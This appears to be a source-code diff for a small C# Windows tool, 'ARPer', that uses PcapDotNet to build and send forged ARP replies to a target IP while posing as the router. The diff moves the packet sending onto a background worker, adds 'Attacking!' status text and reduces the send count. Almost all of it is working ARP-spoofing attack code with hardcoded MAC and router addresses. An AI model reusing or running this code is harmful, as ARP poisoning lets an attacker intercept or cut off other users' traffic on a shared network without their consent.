@@ -26,6 +26,7 @@ using PcapDotNet.Packets.Igmp;
 using PcapDotNet.Packets.IpV4;
 using PcapDotNet.Packets.IpV6;
 using PcapDotNet.Packets.Transport;
+using System.ComponentModel;
 
 namespace ARPer
 {
@@ -55,6 +56,7 @@ namespace ARPer
 
         private void button_Click(object sender, RoutedEventArgs e)
         {
+            progress.Text = "Attacking!";
             if (isIpValid(attackMe.Text))
             {
                 string mac = ""; //TODO: make this customizable
@@ -71,7 +73,38 @@ namespace ARPer
                     mac = "C8:3A:35:07:41:68";
                     ip = "192.168.0.1";
                 }
-                sendArp(attackMe.Text, mac, ip); 
+                BackgroundWorker bg = new BackgroundWorker();
+                bg.WorkerReportsProgress = true;
+                bg.DoWork += new DoWorkEventHandler(sendArp);//attackMe.Text, mac, ip));
+                    //delegate (object o, DoWorkEventArgs args)
+                    //{
+                    //    BackgroundWorker b = o as BackgroundWorker;
+                    //    for (int i = 0; i < 100; i++)
+                    //    {
+                    //        this.Dispatcher.Invoke((Action)(() =>
+                    //        {
+                    //            sendArp(attackMe.Text, mac, ip);
+                    //        }));
+                    //        //b.ReportProgress(i);
+                    //    }
+                    //});
+                bg.ProgressChanged += new ProgressChangedEventHandler(
+                    delegate (object o, ProgressChangedEventArgs args)
+                    {
+                        progress.Text = args.ProgressPercentage.ToString();
+                    });
+                bg.RunWorkerCompleted += new RunWorkerCompletedEventHandler(
+                    delegate (object o, RunWorkerCompletedEventArgs args)
+                    {
+                        progress.Text = "All done!";
+                        //progress.Width = 
+                    });
+                List<object> arguments = new List<object>();
+                arguments.Add(attackMe.Text);
+                arguments.Add(mac);
+                arguments.Add(ip);
+                bg.RunWorkerAsync(arguments);
+                //sendArp(attackMe.Text, mac, ip); 
             }
             else
             {
@@ -105,8 +138,12 @@ namespace ARPer
             return true;
         }
 
-        private void sendArp(string attackIP, string routerMAC, string routerIP)
+        private void sendArp(object sender, DoWorkEventArgs e) //string attackIP, string routerMAC, string routerIP)
         {
+            List<object> genericlist = e.Argument as List<object>;
+            string attackIP = genericlist[0].ToString();
+            string routerMAC = genericlist[1].ToString();
+            string routerIP = genericlist[2].ToString();
             string myMAC = "A0:A8:CD:9A:CB:AD";
             string arpSenderMAC = "0A:5A:7B:30:3F:71";
             IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
@@ -115,15 +152,15 @@ namespace ARPer
                 Console.WriteLine("No interfaces found! Make sure WinPcap is installed.");
                 throw new Exception(); //TODO: catch exception and show error
             }
-            for (int i = 0; i != allDevices.Count; ++i) //TODO: show this in GUI somehow
-            {
-                LivePacketDevice device = allDevices[i];
-                Console.Write((i + 1) + ". " + device.Name);
-                if (device.Description != null)
-                    Console.WriteLine(" (" + device.Description + ")");
-                else
-                    Console.WriteLine(" (No description available)");
-            }
+            //for (int i = 0; i != allDevices.Count; ++i) //TODO: show this in GUI somehow
+            //{
+            //    LivePacketDevice device = allDevices[i];
+            //    Console.Write((i + 1) + ". " + device.Name);
+            //    if (device.Description != null)
+            //        Console.WriteLine(" (" + device.Description + ")");
+            //    else
+            //        Console.WriteLine(" (No description available)");
+            //}
             int deviceIndex = 2; //TODO: make this choosable
             PacketDevice selectedDevice = allDevices[deviceIndex];
             using (PacketCommunicator communicator = selectedDevice.Open(100, PacketDeviceOpenAttributes.Promiscuous, 1000))
@@ -146,7 +183,7 @@ namespace ARPer
                 };
                 PacketBuilder builder = new PacketBuilder(ethLayer, arpLayer);
                 Packet packet = builder.Build(DateTime.Now);
-                for (int i = 0; i < 100; i++)
+                for (int i = 0; i < 1; i++)
                 {
                     communicator.SendPacket(packet);
                 }
